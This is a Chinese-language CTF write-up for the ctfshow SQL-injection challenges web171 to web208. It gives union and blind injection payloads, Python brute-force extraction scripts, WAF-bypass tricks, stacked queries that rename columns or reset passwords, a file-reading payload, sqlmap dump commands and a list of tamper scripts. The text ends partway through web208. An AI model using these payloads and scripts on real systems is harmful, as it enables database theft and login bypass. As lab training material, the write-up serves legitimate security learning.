# 原创
：  ctfshow web入门-sql注入

# ctfshow web入门-sql注入

#### ctfshow web入门-sql注入

## web171

> 



```
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";

```

```
爆数据库名
-1' union select 1,database(),3 --+
爆表名
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
爆列名
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user' --+
爆数据
-1' union select 1,concat(0x7e,id,0x7e,username,0x7e,password),3 from ctfshow_user limit 25--+

```

## web172

> 



```
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";

```

```
爆数据库名
-1' union select database(),2 --+
爆表名
-1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+
爆列名
-1' union select group_concat(column_name),2 from information_schema.columns where table_name='ctfshow_user2' --+
爆数据
-1' union select to_base64(username),to_base64(password) from ctfshow_user2--+

```

## web173

> 



```
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";

```

```
爆数据库名
-1' union select 1,database(),3 --+
爆表名
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
爆列名
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user3' --+
爆数据
-1' union select 1,to_base64(username),to_base64(password) from ctfshow_user3 --+

```

## web174

> 



```
import time
import requests

def boolBlindSql(url):
    flag = ''
    for i in range(1,100):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "?id=1\' and 1=if(ascii(substr((select password from ctfshow_user4 where username=\'flag\'),{},1))&gt;{},1,0) --+".format(i,mid)
            res = requests.get(url + payload)
            if 'admin' in res.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            continue
        else:
            break

if __name__ == '__main__':
    url = "http://9260e8d4-aa8f-47ca-8737-7e4bdc8bff09.challenge.ctf.show:8080/api/v4.php"
    boolBlindSql(url)

```

## web175

> 



```
import time
import requests

def timeBlindSql(url):
    flag = ''
    for i in range(1,100):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            payload = "?id=1\' or if(ascii(substr((select password from ctfshow_user5 where username=\'flag\'),{},1))&gt;{},benchmark(10000000,sha(1)),0)--+".format(i,mid)
            try:
                res = requests.get(url + payload, timeout=1.5)
                high = mid
            except Exception as e:
                low = mid + 1


        if low != 32:
            flag += chr(low)
            print('[+] ' + flag)
            continue
        else:
            break

if __name__ == '__main__':
    url = 'http://ea22cc4b-de61-4e78-8f26-7f4c5cb9b750.challenge.ctf.show:8080/api/v5.php'
    timeBlindSql(url)

```

## web176

> 



```
1' or '1'='1' --+

```

## web177

> 



```
1'or'1'='1'%23
或者
1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username='flag'%23

```

## web178

> 



```
1'or'1'='1'%23
或者
1'%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username='flag'%23

```

## web179

> 



```
1'or'1'='1'%23
或者
1'%0cunion%0cselect%0cpassword,1,1%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%23

```

## web180

> 



```
-1'or(mid(username,1,1)='f')and'1'='1

```

## web181

> 



```
-1'or(mid(username,1,1)='f')and'1'='1

```

## web182

> 



```
-1'or(mid(username,1,1)='f')and'1'='1

```

## web183

> 



```
import requests

def regexpBlindSql(url):
    flag = ''
    chrOfFlag = r'ctfshow{-0123456789abdegijklmnpqruvxyz}'
    for i in range(1,50):
        for ch in chrOfFlag:
            data = {
                "tableName" : "(ctfshow_user)where(mid(pass,{},1))regexp('{}')".format(i,ch)
            }
            res = requests.post(url, data=data)
            if '$user_count = 1;' in res.text:
                flag += ch
                print('[+]' + flag)
                break

if __name__ == '__main__':
    url = '''http://c10f0bff-9f7e-4bdd-8d11-71c0eb7efa49.challenge.ctf.show:8080/select-waf.php'''
    regexpBlindSql(url)

```

## web184

> 



```
import requests
import string
import binascii
url = 'http://1e3df5be-6e3c-443b-b738-2471d9537f9c.challenge.ctf.show:8080/select-waf.php'
payload = {
        "tableName":''
        }
flag = '{'
chrOfFlag = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
judge ='$user_count = 22;'
for i in range(2,50):
    for c in chrOfFlag:
        a = flag + c     
        a = a.encode('utf-8')  #按utf-8编码
        a = binascii.hexlify(a) #编码为16进制
        a = str(a)  #化为字符串
        a = '0x' + a[2 : len(a) - 1] #形成16进制格式
        payload['tableName'] = "ctfshow_user a join ctfshow_user b on (substr(a.pass,8,{}) regexp {})".format(i,a)
        response = requests.post(url, data = payload)
        if response.text.find(judge) != -1:
            flag += c
            print('[+] ' + flag)    
            break

```

## web185

> 



```
import requests


url = 'http://3bfb7aa3-6f20-45d2-a207-b0f1c33cbd17.challenge.ctf.show:8080/select-waf.php'
preflag = 'ctfshow{'
strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
payload = 'ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass, {}, {}))regexp(hex({char}))'

def createNumber(num):
    ret = 'hex(ceil(cot(-ascii(char_length(now())))))'
    if num != 1:
        for i in range(num - 1):
            ret = ret + '+' + 'hex(ceil(cot(-ascii(char_length(now())))))'
    return ret

def noNumber2GetFlag():
    flag = ''
    for i in range(42):
        # print('[+] Start blind {} palce'.format(i))
        for ch in strings:
            data = {
                'tableName' : payload.format(createNumber(i + 1), createNumber(1), char=createNumber(ord(ch)))
            }
            res = requests.post(url, data)
            if res.text.find('43') &gt; 0:
                flag += ch
                print('[+] ' + flag)
                break
    return flag
if __name__ == '__main__':
    print(noNumber2GetFlag())

```

## web186

> 



```
import requests


url = 'http://9ae687ca-baad-41a4-a8f1-a2c9dea3b271.challenge.ctf.show:8080/select-waf.php'
preflag = 'ctfshow{'
strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
payload = 'ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass, {}, {}))regexp(hex({char}))'

def createNumber(num):
    ret = 'hex(ceil(cot(-ascii(char_length(now())))))'
    if num != 1:
        for i in range(num - 1):
            ret = ret + '+' + 'hex(ceil(cot(-ascii(char_length(now())))))'
    return ret

def noNumber2GetFlag():
    flag = ''
    for i in range(42):
        # print('[+] Start blind {} palce'.format(i))
        for ch in strings:
            data = {
                'tableName' : payload.format(createNumber(i + 1), createNumber(1), char=createNumber(ord(ch)))
            }
            res = requests.post(url, data)
            if res.text.find('43') &gt; 0:
                flag += ch
                print('[+] ' + flag)
                break
    return flag
if __name__ == '__main__':
    print(noNumber2GetFlag())

```

## web187

> 



```
  $username = $_POST['username'];
  $password = md5($_POST['password'],true);

  //只有admin可以获得flag
  if($username!='admin'){
      $ret['msg']='用户名不存在';
      die(json_encode($ret));
  }

```

```
POST: username=admin&amp;password=ffifdyop

```

## web188

> 



```
//用户名检测
if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
  $ret['msg']='用户名非法';
  die(json_encode($ret));
}

//密码检测
if(!is_numeric($password)){
  $ret['msg']='密码只能为数字';
  die(json_encode($ret));
}

//密码判断
if($row['pass']==intval($password)){
    $ret['msg']='登陆成功';
    array_push($ret['data'], array('flag'=&gt;$flag));
  }
    

```

```
POST：username=1&lt;1&amp;password=0

```

## web189

> 



```
import requests
from tqdm import tqdm


def load_fileBlindSql():
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    flag = 'ctfshow{'
    while True:
        for ch in tqdm(strings):
            temp = flag + ch
            payload = {
                "username":"if((load_file('/var/www/html/api/index.php'))regexp('{}'),0,1)".format(temp),
                "password":"1"
            }
            res = requests.post('http://98ddf685-7bb6-4661-be3c-81f5e80f2941.challenge.ctf.show:8080/api/index.php',data=payload)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                flag += ch
                print('[+] ' + flag)
                if ch == '}':
                  exit()
                break

if __name__ == '__main__':
    load_fileBlindSql()

```

## web190

> 



```
import requests

def boolBlindSql():
    table_name = ''
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
    for i in range(1, 100):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            # payload = "username=admin' and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{},1,0)--+&amp;password=1"
            # payload = "username=admin' and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&gt;{},1,0)--+&amp;password=1"
            payload = "username=admin' and if(ascii(mid((select group_concat(f1ag) from ctfshow_fl0g),{},1))&gt;{},1,0)--+&amp;password=1"
            res = requests.post(url='http://609c417a-7958-45db-9922-03cb5253db3b.challenge.ctf.show:8080/api/', data=payload.format(i,mid), headers=headers)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            table_name += chr(low)
            print('[+] ' + table_name)
            continue
        else:
            break



if __name__ == '__main__':
    boolBlindSql()

```

## web191

> 



```
import requests

def boolBlindSql():
    table_name = ''
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz,~_+?!}'
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
    for i in range(1, 100):
        low = 32
        high = 127
        while low &lt; high:
            mid = (low + high) &gt;&gt; 1
            # payload = "username=admin' and if(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&gt;{},1,0)--+&amp;password=1"
            # payload = "username=admin' and if(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&gt;{},1,0)--+&amp;password=1"
            payload = "username=admin' and if(ord(mid((select group_concat(f1ag) from ctfshow_fl0g),{},1))&gt;{},1,0)--+&amp;password=1"
            res = requests.post(url='http://e5b85a69-befa-4aca-80d1-9ae2c69224b2.challenge.ctf.show:8080//api/', data=payload.format(i,mid), headers=headers)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            table_name += chr(low)
            print('[+] ' + table_name)
            continue
        else:
            break



if __name__ == '__main__':
    boolBlindSql()

```

## web192

> 



```
import requests

def boolBlindSql():
    table_name = ''
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz,~_+?!}'
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
    for i in range(1, 100):
        for ch in strings:
            # payload = "username=admin' and if((mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))regexp('{}'),1,0)--+&amp;password=1"
            # payload = "username=admin' and if((mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))regexp('{}'),1,0)--+&amp;password=1"
            payload = "username=admin' and if((mid((select group_concat(f1ag) from ctfshow_fl0g),{},1))regexp('{}'),1,0)--+&amp;password=1"
            res = requests.post(url='http://85290226-1b87-48d5-b290-bc17c6dceb66.challenge.ctf.show:8080/api/', data=payload.format(i,ch), headers=headers)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                table_name += ch
                print('[+] ' + table_name)
                break

if __name__ == '__main__':
    boolBlindSql()

```

## web193

> 



```
import requests


def boolBlindSql():
    table_name = ''
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz,~_+?!}'
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
    for i in range(1, 100):
        for ch in strings:
            # payload = "username=admin' and if((mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))regexp('{}'),1,0)--+&amp;password=1"
            # payload = "username=admin' and if((mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),{},1))regexp('{}'),1,0)--+&amp;password=1"
            payload = "username=admin' and if((mid((select group_concat(f1ag) from ctfshow_flxg),{},1))regexp('{}'),1,0)--+&amp;password=1"
            res = requests.post(url='http://10be68af-4b4b-4c03-8358-1945d090f85d.challenge.ctf.show:8080/api/',
                                data=payload.format(i, ch), headers=headers)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                table_name += ch
                print('[+] ' + table_name)
                break


if __name__ == '__main__':
    boolBlindSql()

```

## web194

> 



```
import requests


def boolBlindSql():
    table_name = ''
    strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
    for i in range(1, 100):
        for ch in strings:
            # payload = "username=admin' and if((mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))regexp('{}'),1,0)--+&amp;password=1"
            # payload = "username=admin' and if((mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),{},1))regexp('{}'),1,0)--+&amp;password=1"
            payload = "username=admin' and if((mid((select group_concat(f1ag) from ctfshow_flxg),{},1))regexp('{}'),1,0)--+&amp;password=1"
            res = requests.post(url='http://9db66bc4-fc7f-4f86-a18b-42ef05bdce11.challenge.ctf.show:8080/api/',
                                data=payload.format(i, ch), headers=headers)
            if "\\u5bc6\\u7801\\u9519\\u8bef" in res.text:
                table_name += ch
                print('[+] ' + table_name)
                if ch == '}':
                    exit(0)
                break


if __name__ == '__main__':
    boolBlindSql()

```

## web195

> 



```
POST：username=0;update`ctfshow_user`set`pass`=1&amp;password=1

```

## web195

> 



```
POST：username=1;select(1)&amp;password=1

```

## web197

> 



```
# @Author:Y4tacker
import requests

url = "http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"
for i in range(100):
    if i == 0:
        data = {
            'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '
                        'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '
                        'varchar(255);',
            'password': f'{i}'
        }
        r = requests.post(url, data=data)
    data = {
        'username': '0x61646d696e',
        'password': f'{i}'
    }
    r = requests.post(url, data=data)
    if "登陆成功" in r.json()['msg']:
        print(r.json()['msg'])
        break

```

```
POST：username=1;show tables;&amp;password=ctfshow_user

```

## web198

> 



```
POST：username=1;show tables;&amp;password=ctfshow_user

```

## web199

> 



```
POST：username=1;show tables;&amp;password=ctfshow_user

```

## web200

> 



```
POST：username=1;show tables;&amp;password=ctfshow_user

```

## web201

> 



```
爆库名
python sqlmap.py -u "http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/api/?id=" --dbs --referer http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/sqlmap.php

```

```
爆表名
python sqlmap.py -u "http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/api/?id=1" -D ctfshow_ web --tables --dbms=mysql --referer http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/sqlmap.php

```

```
爆列名
python sqlmap.py -u "http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/api/?id=1" --dbms=mysql -D ctfshow_web -T ctfshow_user --columns --referer http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/sqlmap.php

```

```
爆数据
python sqlmap.py -u "http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/api/?id=1" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump --referer http://d7dfc7b7-b388-4a97-8b0d-82fced33e093.challenge.ctf.show:8080/sqlmap.php

```

## web202

> 



```
爆库名
python sqlmap.py -u "http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/api/" --data="id=1" --dbs --dbms=mysql --referer http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/sqlmap.php
爆表名
python sqlmap.py -u "http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/api/" --data="id=1" -D ctfshow_web --tables --dbms=mysql --referer http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/sqlmap.php
爆列名
python sqlmap.py -u "http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/api/" --data="id=1" -D ctfshow_web -T ctfshow_user --columns --dbms=mysql --referer http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/sqlmap.php
爆数据
python sqlmap.py -u "http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/api/" --data="id=1" -D ctfshow_web -T ctfshow_user -C pass --dump --dbms=mysql --referer http://75d0cf0b-b935-42c8-bffd-f26f6bca5d7b.challenge.ctf.show:8080/sqlmap.php

```

## web203

> 



```
爆库名
python sqlmap.py -u http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080/api/index.php --dbs --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080//sqlmap.php
爆表名
python sqlmap.py -u http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080//sqlmap.php
爆列名
python sqlmap.py -u http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user --columns --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080//sqlmap.php
爆数据
python sqlmap.py -u http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user -C pass --dump --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://684a83fa-20dd-4966-a220-6c2e3aa5ad8b.challenge.ctf.show:8080//sqlmap.php

```

## web204

> 



```
爆库名
python sqlmap.py -u http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=4f5422dc8o50qm5gu5ffmu5s6t; ctfshow=0cac09c9c754a5404ce718d2f466bdf5" --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/sqlmap
爆表名
python sqlmap.py -u http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=4f5422dc8o50qm5gu5ffmu5s6t; ctfshow=0cac09c9c754a5404ce718d2f466bdf5" --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/sqlmap
爆列名
python sqlmap.py -u http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user --columns --cookie="PHPSESSID=4f5422dc8o50qm5gu5ffmu5s6t; ctfshow=0cac09c9c754a5404ce718d2f466bdf5" --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/sqlmap
爆数据
python sqlmap.py -u http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user -C pass --dump --cookie="PHPSESSID=4f5422dc8o50qm5gu5ffmu5s6t; ctfshow=0cac09c9c754a5404ce718d2f466bdf5" --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer http://92970373-2067-4f09-842f-25cdeabde44f.challenge.ctf.show:8080/sqlmap

```

## web205

> 



```
python sqlmap.py -u http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/sqlmap

python sqlmap.py -u http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/sqlmap

python sqlmap.py -u http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user --columns --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/sqlmap

python sqlmap.py -u http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_user --dump --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://323cfd1f-4397-45a1-9e78-a416a7b81daa.challenge.ctf.show:8080/sqlmap

```

## web206

> 



```
爆库名
python sqlmap.py -u http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/sqlmap
爆表名
python sqlmap.py -u http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/sqlmap
爆列名
python sqlmap.py -u http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxc --columns --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/sqlmap
爆数据
python sqlmap.py -u http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://47ed3614-3983-4c90-9798-ec2f07c5b224.challenge.ctf.show:8080/sqlmap

```

## web207

> 



```
space2comment.py用/**/代替空格

apostrophemask.py用utf8代替引号

equaltolike.pylike代替等号

space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）

greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。

space2hash.py空格替换为#号,随机字符串以及换行符

apostrophenullencode.py绕过过滤双引号，替换字符和双引号。

halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.py在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’

space2mssqlblank.py(mssql)空格替换为其它空符号

base64encode.py　用base64编码替换

space2mssqlhash.py　替换空格

modsecurityversioned.py过滤空格，包含完整的查询版本注释

space2mysqlblank.py　空格替换其它空白符号(mysql)

between.py用between替换大于号（&gt;）

space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

multiplespaces.py围绕SQL关键字添加多个空格

space2plus.py用+替换空格

bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like

nonrecursivereplacement.py双重查询语句,取代SQL关键字

space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾

chardoubleencode.py双url编码(不处理以编码的)

unionalltounion.py替换UNION ALLSELECT UNION SELECT

charencode.py　url编码

randomcase.py随机大小写

unmagicquotes.py宽字符绕过 GPCaddslashes

randomcomments.py用/**/分割sql关键字

charunicodeencode.py字符串 unicode 编码

securesphere.py追加特制的字符串

versionedmorekeywords.py注释绕过

space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’

halfversionedmorekeywords.py关键字前加注释

```

```
爆库名
python sqlmap.py -u http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/index.php --dbs --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py"
爆表名
python sqlmap.py -u http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/index.php -D ctfshow_web --tables --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py"
爆列名
python sqlmap.py -u http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxca --columns --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py"
爆数据
python sqlmap.py -u http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/index.php -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --cookie="PHPSESSID=8ulgn91qojur85kdt21f51j74j" --safe-url=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/api/getToken.php  --safe-freq=1 --method=PUT --data="id=1" --headers="Content-Type: text/plain" --dbms=mysql --referer=http://a8d0dc36-3e25-4dca-bd2b-41311f57b93d.challenge.ctf.show:8080/sqlmap --tamper="tamper/space2comment.py"

```

## wen208

> 



```
$id = str_replace('select', '', $id);
  function waf($str){
   return preg_match('/ /', $str);
  }

```

```
爆库名
